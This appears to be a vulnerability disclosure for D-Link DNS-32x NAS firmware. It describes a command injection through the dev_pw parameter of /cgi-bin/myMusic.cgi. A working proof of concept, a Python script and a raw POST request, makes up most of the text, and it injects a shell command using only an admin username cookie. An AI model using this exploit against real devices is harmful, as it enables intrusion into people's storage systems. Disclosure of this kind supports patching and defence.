# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_set_airplay_content function of the file /cgi-bin/myMusic.cgi.  The variable `dev_pw`is passed from a POST request and is assigned to `v5` via the `snprintf` function at line 36 and invoked by the `system` command, it can lead to command execution. 

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723716837449-ffc51fc6-4fea-4f9c-85c0-d215c81def92.png#averageHue=%23fefefd&clientId=u35e56796-540d-4&from=paste&height=445&id=u37d56097&originHeight=445&originWidth=1630&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68086&status=done&style=none&taskId=uc046d413-bb87-40c8-abd4-8fec0e381cc&title=&width=1630)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_set_airplay_content&ptype=clean&dev_pw=`touch%09/tmp/118`&type=1&user=photos&idx=10&dev_name=%0atouch%09/tmp/118%0a&dev_type=10&page=19&r=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/myMusic.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_set_airplay_content&ptype=clean&dev_pw=`touch%09/tmp/118`&type=1&user=photos&idx=10&dev_name=%0atouch%09/tmp/118%0a&dev_type=10&page=19&r=/tmp/
```
